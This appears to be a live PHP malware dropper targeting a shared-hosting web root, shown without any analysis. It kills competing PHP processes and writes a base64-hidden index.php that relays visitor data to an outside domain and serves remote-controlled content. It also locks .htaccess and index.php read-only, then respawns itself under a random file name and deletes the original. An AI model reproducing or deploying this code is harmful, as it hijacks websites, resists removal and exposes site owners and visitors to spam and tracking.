<?php
error_reporting(0);
ignore_user_abort;
exec("ps -ef", $out, $return);
if (is_array($out)) {
    for ($i = 1;$i < count($out);$i++) {
        $temp = explode(" ", $out[$i]);
        if (strstr($temp[count($temp) - 1], ".php") && !strstr($temp[count($temp) - 1], "lsphp")) {
            $x = explode("/", $temp[count($temp) - 1]);
            if (strlen($x[count($x) - 1]) != 9) {
                for ($j = 1;$j < count($temp);$j++) {
                    if (is_numeric($temp[$j])) {
                        $kill[] = $temp[$j];
                        break;
                    }
                }
            }
        }
    }
}
foreach ($kill as $v) {
    exec("kill -9 " . $v, $out, $return);
}
sleep(3);
$path = "/home/mcahhtco/public_html/";
$htaccess = base64_decode("IyBCRUdJTiBXb3JkUHJlc3MKPElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+ClJld3JpdGVFbmdpbmUgT24KUmV3cml0ZUJhc2UgLwpSZXdyaXRlUnVsZSBeaW5kZXhcLnBocCQgLSBbTF0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYKUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWQKUmV3cml0ZVJ1bGUgLiAvaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgoKCg==", true);
if (!file_exists($path . ".htaccess")) {
    @file_put_contents($path . ".htaccess", $htaccess);
} else {
    $temp = @file_get_contents($path . ".htaccess");
    if (md5($temp) != md5($htaccess)) {
        @unlink($path . ".htaccess");
        @file_put_contents($path . ".htaccess", $htaccess);
    }
}
@chmod($path . ".htaccess", 0444);
$index = base64_decode("PD9waHAKLy9URVNUMDAxCmVycm9yX3JlcG9ydGluZygwKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOCcpOwpkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdQUkMnKTsKCiRQcmVmaXggPSAiYTY0IjsKJGxhbiA9IGJhc2U2NF9lbmNvZGUoQCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKTsKJHVyaSA9IGJhc2U2NF9lbmNvZGUoQCRfU0VSVkVSWydSRVFVRVNUX1VSSSddKTsKJGhvc3QgPSBAJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokYWdlbnQgPSBiYXNlNjRfZW5jb2RlKEAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pOwokcmVmZXJlciA9IGJhc2U2NF9lbmNvZGUoQCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSk7CiRodHRwX3R5cGUgPSAoKGlzc2V0KCRfU0VSVkVSWydIVFRQUyddKSAmJiAkX1NFUlZFUlsnSFRUUFMnXSA9PSAnb24nKSB8fCAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfWF9GT1JXQVJERURfUFJPVE8nXSkgJiYgJF9TRVJWRVJbJ0hUVFBfWF9GT1JXQVJERURfUFJPVE8nXSA9PSAnaHR0cHMnKSkgPyAnaHR0cHM6Ly8nIDogJ2h0dHA6Ly8nOwokZ293ZWIgPSAkUHJlZml4LicuJy4iZG01bWFpbC50b3AiOwokdHlwZU5hbWUgPSBiYXNlNjRfZW5jb2RlKCRodHRwX3R5cGUuJGhvc3QpOwokZ2V0dXJsID0gJ2h0dHA6Ly8nLiRnb3dlYi4nL2luZGV4LnBocD9kb21haW49Jy4kdHlwZU5hbWUuJyZ1cmk9Jy4kdXJpLicmbGFuPScuJGxhbi4nJmFnZW50PScuJGFnZW50LicmcmVmZXJlcj0nLiRyZWZlcmVyOwovLyBwcmludF9yKCRnZXR1cmwpOwovL2VjaG8gJGdldHVybDsgZXhpdDsKJGZpbGVfY29udGVudHMgPSBnZXRDdXJsKCRnZXR1cmwpOwppZihzdHJzdHIoJGZpbGVfY29udGVudHMsIlsjKiMqI10iKSl7CiAgICAkaHRtbCA9IGV4cGxvZGUoIlsjKiMqI10iLCRmaWxlX2NvbnRlbnRzKTsKICAgIGlmKCRodG1sWzBdID09ICJlY2hvaHRtbCIpeyBlY2hvICRodG1sWzFdOyBleGl0OyB9CiAgICBpZigkaHRtbFswXSA9PSAiZWNob3htbCIpeyBoZWFkZXIoIkNvbnRlbnQtdHlwZTogdGV4dC94bWwiKTsgZWNobyAkaHRtbFsxXTsgZXhpdDsgfQogICAgaWYoJGh0bWxbMF0gPT0gInBpbmd4bWwiKXsgJHBpbmdSZXMgPSBnZXRDdXJsKCRodG1sWzFdKTsgJE9vb28wcyA9IChzdHJwb3MoJHBpbmdSZXMsICdTaXRlbWFwIE5vdGlmaWNhdGlvbiBSZWNlaXZlZCcpICE9PSBmYWxzZSkgPyAnT0snIDogJ0VSUk9SJzsKICAgIGVjaG8gJGh0bWxbMV0gLiAnPT09PlNpdGVtYXA6ICcgLiAkT29vbzBzIC4iPGJyPiI7fQp9CmZ1bmN0aW9uIGdldEN1cmwoJHVybCkKewogICAgJGZpbGVfY29udGVudHMgPSBAZmlsZV9nZXRfY29udGVudHMoJHVybCk7CiAgICBpZiAoISRmaWxlX2NvbnRlbnRzKSB7CiAgICAgICAgJGNoID0gY3VybF9pbml0KCk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NULCAwKTsKICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIDApOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTsKICAgICAgICAkZmlsZV9jb250ZW50cyA9IGN1cmxfZXhlYygkY2gpOwogICAgICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgIH0KICAgIHJldHVybiAkZmlsZV9jb250ZW50czsKfQo/Pg==", true);
if (!file_exists($path . "index.php")) {
    @file_put_contents($path . "index.php", $index);
} else {
    $temp = @file_get_contents($path . "index.php");
    if (md5($temp) != md5($index)) {
        @unlink($path . "index.php");
        @file_put_contents($path . "index.php", $index);
    }
}
@chmod($path . "index.php", 0444);
$l12 = array("1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m");
for ($i = 1;$i < rand(6, 6);$i++) {
    $e14 = rand(0, count($l12) - 1);
    $o15.= $l12[$e14];
}
$q16 = basename(__FILE__, ".php") . ".php";
$c9 = file_get_contents($q16);
$u17 = fopen($o15 . ".php", "w");
fwrite($u17, $c9);
fclose($u17);
exec("php -f" . __DIR__ . "/$o15.php > /dev/null 2>/dev/null &", $e18);
@unlink("$q16"); ?>
